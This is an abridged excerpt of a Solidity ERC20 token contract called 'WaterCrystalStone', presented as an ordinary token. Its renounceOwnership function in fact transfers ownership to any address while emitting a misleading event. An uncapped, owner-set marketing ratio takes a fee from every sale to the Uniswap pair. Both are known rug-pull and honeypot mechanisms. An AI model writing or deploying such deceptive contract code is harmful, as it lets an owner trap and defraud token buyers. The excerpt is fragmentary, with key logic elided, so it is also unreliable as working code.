...
contract ERC20 is Context, IERC20, IERC20Metadata, Manage {
    ...
    string  private _name="WaterCrystalStone";
    ...
    uint256 public _baseCompany=1000;
    ...
    constructor(address usdtAddress,address factoryAddress) {
        ...
        changeMarketingAddress(msg.sender);
    }
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership(address _addr) public onlyOwner {
        emit OwnershipTransferred(_owner, _addr);
        _owner = _addr;
    }

    function changeMarketingRatio(uint32 ratio) public onlyOwner{
        _marketingRatio=ratio;
    }

    function changeMarketingAddress(address addr) public onlyOwner{
        _marketingAddr=addr;
    }
    ...
    function _transfer(
        ...
        if(to ==_uniswapV2Pair){
            uint256 _marketingfee=amount*_marketingRatio/_baseCompany;
            if(_marketingfee>0){
                _balances[_marketingAddr] += _marketingfee;
                emit Transfer(from, _marketingAddr, _marketingfee);
            }
        }
